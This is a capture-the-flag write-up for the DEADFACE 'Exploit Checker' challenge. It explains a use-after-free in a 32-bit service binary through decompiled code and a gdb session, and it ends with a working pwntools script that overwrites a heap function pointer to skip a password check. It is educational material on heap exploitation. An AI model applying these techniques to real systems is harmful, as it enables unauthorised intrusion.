# Exploit Checker

### Or an Introduction to UAF

The description for this challenge is as follows: 

*DEADFACE is running a service to allow their members to check whether exploits are compatible with chosen targets. They are also using it to store a key they are using to enable c2c updates on exploited hosts. We have gotten an old copy of the binary, but the password to access the admin key and the admin key have changed.*

*Retrieve the admin key from the remote service running on: exploitchecker.deadface.io:1337*

*The flag will be in format: flag{.*}.*

This challenge was worth 300 points and got 30 solves; I would place it on the easier end of medium in terms of difficulty, but it does require some basic knowledge of heap pwn and a little bit of reverse-engineering. In terms of downloadables, you are given the binary for the service, but no additional libc files or similar information.

**TL;DR Solution:** Note that the "delete" functionality is based on a function pointer in a heap structure, and that it does not delete the pointer to that heap structure that exists in the stack. Two different heap objects can be created, which are both allocated 0x18 bytes. This means that by making a target and deleting it, then making an exploit, the exploit's chunk will be allocated in the bin left by the deleted target, allowing an overwrite of the delete function pointer with an arbitrary value that will be called on the next delete target. This can be filled in with an address halfway through the get admin key function to bypass the password check and get the flag.

## Gathering Information:

So, when we connect to the provided address, we are presented with a menu with a variety of options
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ nc exploitchecker.deadface.io 1337
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

Welcome to the 1337 Exploit Checker
1: Make a Target
2: Delete a Target
3: Create an Exploit
4: Check Exploit Compatability
5: Retrieve Admin Key
6: Exit
```
I then dropped it into Ghidra and made some interesting observations pretty quickly. Firstly, the binary internally provides for a remote connection, so we will have to netcat to localhost when debugging locally, and we need to rely on functions like send to get information rather than things like puts. Also, this is a 32-bit binary. In terms of the menu options, option 5 includes functionality to send us the flag (redacted in the local binary of course!); it's intended to sort of look like we could get it with the right password, but I think our actual input here is ignored in favor of hardcoded values that will never let us view the password.
```
void retrieve_admin_key(void)

{
  int iVar1;
  
  send(fork_sock,"What is the password?\n",0x17,0);
  recv(fork_sock,"aaaaaaaaaaaaaaaa",0x10,0);
  iVar1 = strcmp("ga*wi58Fw#o&WOG9","aaaaaaaaaaaaaaaa");
  if (iVar1 == 0) {
    send(fork_sock,"flag{--------------------------}\n",0x22,0);
  }
  else {
    send(fork_sock,"Bad Password\n",0xe,0);
  }
  return;
}
```
Now, the newS1 function is what happens when we select option 1. This makes a heap chunk 0x18 in size using malloc, but interestingly, it places a pointer for the delete_structure function 0x10 bytes from the start of the mallocced area following the hostname.  
```
void * newS1(int *param_1)

{
  void *__buf;
  int iVar1;
  int in_GS_OFFSET;
  char local_32 [17];
  char local_21 [17];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  __buf = malloc(0x18);
  send(*param_1,"What is the hostname?\n",0x17,0);
  recv(*param_1,__buf,0x10,0);
  *(code **)((int)__buf + 0x10) = delete_structure;
  ...
    return __buf;
}
```
This delete_structure pointer controls the behavior of option 2; if a target is made, the S1 stack variable is set to the address of the new heap chunk, and the address at S1 + 0x10 (i.e. where the delete_structure pointer is placed in default behavior) is called with S1 as its first argument.
```
    case 0x31:
      S1 = newS1(local_20);
      break;
    default:
      if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    case 0x32:
      if (S1 == 0) {
        send(*local_20,"No target?\n",0xc,0);
      }
      else {
        (**(code **)(S1 + 0x10))(S1,local_20);
      }
      break;
```
## Identifying the UAF:

If we have a quick look at delete_structure itself, we can see that it's a very simple function that pretty much just frees the address of its first parameter, i.e. S1. However, **it does not delete or otherwise zero out that parameter**. The switch case for option 2 doesn't do anything in that regard either. This indicates a use-after-free, or UAF vulnerability. Basically, these occur whenever a heap chunk (the result of a malloc call) is freed, but a pointer to that chunk persists and can be used in subsequent activities. This can allow an attacker to view or modify heap bins' metadata depending on the exact conditions of the exploit, which can most typically result in heap or libc leaks and arbitrary writes, although that is somewhat above the paygrade of this specific writeup (I have some that [discuss this more in-depth](https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/HTB%20UniCTF%20Finals%202022/Robo-quest)) 
```
void delete_structure(void *param_1,int *param_2)

{
  send(*param_2,"Deleting structure!\n",0x15,0);
  free(param_1);
  return;
}

```
In this specific instance, the existance of a function pointer on the heap simplifies matters significantly. If we look ahead to option 3 (newS2/make an exploit), we see that this also allocates an heap chunk 0x18 in size. This is very significant. As alluded to earlier, when a heap chunk is freed, it goes in a bin; the exact parameters of that bin depend on your libc version, the chunk's original size, and what heap bins already exist. Heap bins will be filled with new chunks if a compatible chunk is allocated; a new chunk of exactly the same size as a bin is virtually guaranteed to go in that bin. This means that if we create a target, delete it, then make an exploit, the chunk containing the exploits data will be placed on the former site of the target's data on the heap. Since delete_structure does nothing to remove the address of the former target's chunk from the relevant local variable, if we now try to delete target again, the address it attempts to call as a function pointer will be based on the architecture and os that we gave it, as integers, since they are read into buf+0x10 and buf+0x12. **This lets us jump to a single arbitrary address.**
```
void * newS2(int *param_1)

{
  void *__buf;
  int iVar1;
  int in_GS_OFFSET;
  char local_54 [17];
  char local_43 [17];
  char local_32 [17];
  char local_21 [17];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  __buf = malloc(0x18);
  send(*param_1,"What is the name of the exploit?\n",0x22,0);
  recv(*param_1,__buf,0x10,0);
  send(*param_1,"What is the architecture?\n",0x1b,0);
  recv(*param_1,local_54,0x10,0);
  iVar1 = atoi(local_54);
  *(short *)((int)__buf + 0x10) = (short)iVar1;
  send(*param_1,"What is the os?\n",0x11,0);
  recv(*param_1,local_43,0x10,0);
  iVar1 = atoi(local_43);
  *(short *)((int)__buf + 0x12) = (short)iVar1;
```

## Debugging Sidenote:

My methodology to debug this type of binary locally is to run the binary in gdb in one tab, set a breakpoint just before the fork, the connect in with netcat/pwntools in another tab. Then I can set follow-fork-mode child and debug relatively normally. Full disclaimer: there may be a better way, this is just something I came up with myself.
```
0x08048f49 <+450>:   add    esp,0x10
   0x08048f4c <+453>:   call   0x80486c0 <fork@plt>
   0x08048f51 <+458>:   mov    DWORD PTR [ebp-0x430],eax
   0x08048f57 <+464>:   cmp    DWORD PTR [ebp-0x430],0x0
   0x08048f5e <+471>:   jne    0x8048ed8 <main+337>
   0x08048f64 <+477>:   sub    esp,0xc
   0x08048f67 <+480>:   push   DWORD PTR [ebp-0x43c]
   0x08048f6d <+486>:   call   0x8048730 <close@plt>
   0x08048f72 <+491>:   add    esp,0x10
   0x08048f75 <+494>:   sub    esp,0xc
   0x08048f78 <+497>:   push   DWORD PTR [ebp-0x434]
   0x08048f7e <+503>:   call   0x8048bf8 <recv_loop>
   0x08048f83 <+508>:   add    esp,0x10
   0x08048f86 <+511>:   jmp    0x8048ed8 <main+337>
End of assembler dump.
gef➤  b *main+453
Breakpoint 1 at 0x8048f4c
gef➤  b *recv_loop+258
Breakpoint 2 at 0x8048cfa
gef➤
...
→  0x8048f4c <main+453>       call   0x80486c0 <fork@plt>
   ↳   0x80486c0 <fork@plt+0>     jmp    DWORD PTR ds:0x804b048
       0x80486c6 <fork@plt+6>     push   0x78
       0x80486cb <fork@plt+11>    jmp    0x80485c0
       0x80486d0 <listen@plt+0>   jmp    DWORD PTR ds:0x804b04c
       0x80486d6 <listen@plt+6>   push   0x80
       0x80486db <listen@plt+11>  jmp    0x80485c0
──────────────────────────────────────────────────────────────────────── arguments (guessed) ────
fork@plt (
   [sp + 0x0] = 0xf7dcdd3c → 0x677f9a5f,
   [sp + 0x4] = 0xf7fc97b0 → 0xf7fd17e8 → "GLIBC_PRIVATE",
   [sp + 0x8] = 0x00000010,
   [sp + 0xc] = 0x00000003,
   [sp + 0x10] = 0x00000000
)
──────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "exploitchecker_", stopped 0x8048f4c in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048f4c → main()
─────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  set follow-fork-mode child
gef➤  ni
...
→  0x8048cfa <recv_loop+258>  call   eax
    0x8048cfc <recv_loop+260>  add    esp, 0x10
    0x8048cff <recv_loop+263>  jmp    0x8048d30 <recv_loop+312>
    0x8048d01 <recv_loop+265>  sub    esp, 0xc
    0x8048d04 <recv_loop+268>  push   DWORD PTR [ebp-0x1c]
    0x8048d07 <recv_loop+271>  call   0x8048987 <newS2>
─────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x804885b (
   [sp + 0x0] = 0x0804c5b0 → 0x00000a31 ("1\n"?),
   [sp + 0x4] = 0xffffcce0 → 0x00000004
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "exploitchecker_", stopped 0x8048cfa in recv_loop (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048cfa → recv_loop()
[#1] 0x8048f83 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/wx $eax
0x804885b <delete_structure>:   0x83e58955
...
 →  0x8048cfa <recv_loop+258>  call   eax
    0x8048cfc <recv_loop+260>  add    esp, 0x10
    0x8048cff <recv_loop+263>  jmp    0x8048d30 <recv_loop+312>
    0x8048d01 <recv_loop+265>  sub    esp, 0xc
    0x8048d04 <recv_loop+268>  push   DWORD PTR [ebp-0x1c]
    0x8048d07 <recv_loop+271>  call   0x8048987 <newS2>
─────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x130012 (
   [sp + 0x0] = 0x0804c5b0 → "17\n",
   [sp + 0x4] = 0xffffcce0 → 0x00000004
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "exploitchecker_", stopped 0x8048cfa in recv_loop (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048cfa → recv_loop()
[#1] 0x8048f83 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/wx $eax
0x130012:       Cannot access memory at address 0x130012
```
The above results occur if you input 18 (0x12) as the architecture, and 19 (0x13) as the os when creating an exploit if you do the create target, delete target, create exploit, delete target methodology, further confirming the ability to jump to an arbitrary address.

Also, I would recommend a procedure like this when you inevitably segfault the binary and it won't run anymore because the socket never closed properly so the port is still in use.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ sudo netstat -tulpn | grep LISTEN
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      3750/exploitchecker
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ kill 3750
```

## Creating the Exploit:

At this point, the main thing to do is come up with an address to jump to that will give us the flag. The obvious choice is to look at the retrieve_admin_key function, since that can print the flag off. If we jump to 0x08048bc5 halfway through the function, we can bypass the password check and jump directly to the part that sends the flag. 

![image](https://user-images.githubusercontent.com/10614967/196070952-434bc352-5738-4b40-8862-fa5b9c1697cb.png)

The following script will overwrite the delete_structure pointer with the address to print the flag:
```
from pwn import *

target = remote('exploitchecker.deadface.io', 1337)

addr1 = str(0x8bc5)
addr2 = str(0x0804)
unimportant = str(1)

print(target.recvuntil(b'6: Exit'))
target.sendline(b'1')


print(target.recvuntil(b'What'))
target.sendline(unimportant)
print(target.recvuntil(b'What'))
target.sendline(unimportant)
print(target.recvuntil(b'What'))
target.sendline(unimportant)

print(target.recvuntil(b'6: Exit'))
target.sendline(b'2')
print(target.recvuntil(b'6: Exit'))
target.sendline(b'3')

print(target.recvuntil(b'What'))
target.sendline(unimportant)
print(target.recvuntil(b'What'))
target.sendline(addr1)
print(target.recvuntil(b'What'))
target.sendline(addr2)
print(target.recvuntil(b'What'))
target.sendline(unimportant)
print(target.recvuntil(b'What'))
target.sendline(unimportant)

print(target.recvuntil(b'6: Exit'))
target.sendline(b'2')
target.interactive()
```
This will print the flag:
```
b' is the type?\n\x001: Make a Target\n2: Delete a Target\n3: Create an Exploit\n4: Check Exploit Compatability\n5: Retrieve Admin Key  \n6: Exit'
[*] Switching to interactive mode

\x00flag{r3M0t3-Use-Aft3r-Fr33-B@bY}
\x00$
```
Thanks for reading!
